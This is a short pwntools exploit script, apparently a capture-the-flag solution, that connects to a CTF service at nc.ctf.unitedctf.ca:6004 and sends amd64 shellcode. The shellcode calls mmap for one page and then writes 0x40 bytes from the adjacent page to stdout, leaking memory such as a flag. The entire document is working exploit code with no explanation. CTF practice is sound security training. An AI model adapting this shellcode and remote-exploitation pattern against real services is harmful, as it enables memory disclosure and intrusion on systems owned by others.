#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 6004

shellcode = """\
    /* pages returned by the kernel through mmap are adjacent in memory */

    /* mmap */
    xor rax,rax
    mov al,9
    mov rsi,0x1000
    xor rdx,rdx
    inc rdx
    mov r10,0x22
    mov r8,-1
    xor r9,r9
    syscall

    /* write */
    mov rsi,rax
    and rsi,0xfffffffffffff000
    add rsi,0x1000
    xor rax,rax
    xor rdi,rdi
    xor rdx,rdx
    inc rax
    inc rdi
    mov dl,0x40
    syscall
"""

r = remote(RHOST, RPORT)
r.recvuntil(b"> ")
r.sendline(asm(shellcode))
r.success(r.recvline().decode())
